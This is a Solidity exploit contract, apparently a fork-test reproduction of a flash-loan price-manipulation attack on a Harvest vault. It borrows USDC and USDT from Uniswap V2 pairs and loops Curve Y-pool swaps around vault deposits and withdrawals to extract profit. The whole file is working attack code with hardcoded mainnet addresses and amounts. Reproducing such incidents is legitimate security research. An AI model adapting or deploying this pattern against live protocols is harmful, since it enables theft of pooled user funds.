// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

contract Exploit {
    address public _cheat;
    address public _usdcPair;
    address public _usdtPair;
    address public _curveYSwap;
    address public _harvest;
    address public _usdt;
    address public _usdc;
    address public _fusdc;
    uint256 public _usdcLoan;
    uint256 public _usdcRepayment;
    uint256 public _usdtLoan;
    uint256 public _usdtRepayment;

    function run() external returns (uint256 profit) {
        _cheat = 0x7109709ECfa91a80626fF3989D68f67F5b1DD12D;
        _usdcPair = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
        _usdtPair = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;
        _curveYSwap = 0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51;
        _harvest = 0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE;
        _usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
        _usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        _fusdc = _harvest;
        _usdcLoan = 150000000 * 10 ** 6;
        _usdcRepayment = (_usdcLoan * 100301) / 100000;
        _usdtLoan = 17300000 * 10 ** 6;
        _usdtRepayment = (_usdtLoan * 100301) / 100000;

        _cheat.call(abi.encodeWithSignature("createSelectFork(string,uint256)", "mainnet", 11129473));

        (bool ok, bytes memory dat) = _usdc.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
        uint256 initUsdc = abi.decode(dat, (uint256));
        (ok, dat) = _usdt.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
        uint256 initUsdt = abi.decode(dat, (uint256));

        _usdt.call(abi.encodeWithSignature("approve(address,uint256)", _curveYSwap, type(uint256).max));
        _usdc.call(abi.encodeWithSignature("approve(address,uint256)", _curveYSwap, type(uint256).max));
        _usdc.call(abi.encodeWithSignature("approve(address,uint256)", _harvest, type(uint256).max));
        _usdt.call(abi.encodeWithSignature("approve(address,uint256)", _usdtPair, type(uint256).max));
        _usdc.call(abi.encodeWithSignature("approve(address,uint256)", _usdcPair, type(uint256).max));


        _usdcPair.call(abi.encodeWithSignature("swap(uint256,uint256,address,bytes)", _usdcLoan, 0, address(this), new bytes(0)));

        (ok, dat) = _usdc.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
        uint256 finUsdc = abi.decode(dat, (uint256));
        (ok, dat) = _usdt.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
        uint256 finUsdt = abi.decode(dat, (uint256));

        profit = (finUsdc + finUsdt) - (initUsdc + initUsdt);
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        if (msg.sender == _usdcPair) {
            _usdtPair.call(abi.encodeWithSignature("swap(uint256,uint256,address,bytes)", 0, _usdtLoan, address(this), new bytes(0)));
            _usdc.call(abi.encodeWithSignature("transfer(address,uint256)", _usdcPair, _usdcRepayment));
        } else if (msg.sender == _usdtPair) {
            for (uint256 i = 0; i < 6; i++) {
                theSwap(i);
            }
            _usdt.call(abi.encodeWithSignature("transfer(address,uint256)", msg.sender, _usdtRepayment));
        }
    }

    function theSwap(uint256) internal {
        _curveYSwap.call(abi.encodeWithSignature("exchange_underlying(int128,int128,uint256,uint256)", int128(2), int128(1), 17200000 * 10 ** 6, 17000000 * 10 ** 6));
        _harvest.call(abi.encodeWithSignature("deposit(uint256)", 149000000000000));
        _curveYSwap.call(abi.encodeWithSignature("exchange_underlying(int128,int128,uint256,uint256)", int128(1), int128(2), 17310000 * 10 ** 6, 17000000 * 10 ** 6));
        (bool ok, bytes memory dat) = _fusdc.call(abi.encodeWithSignature("balanceOf(address)", address(this)));
        uint256 bal = abi.decode(dat, (uint256));
        _harvest.call(abi.encodeWithSignature("withdraw(uint256)", bal));
    }

    receive() external payable {}
}
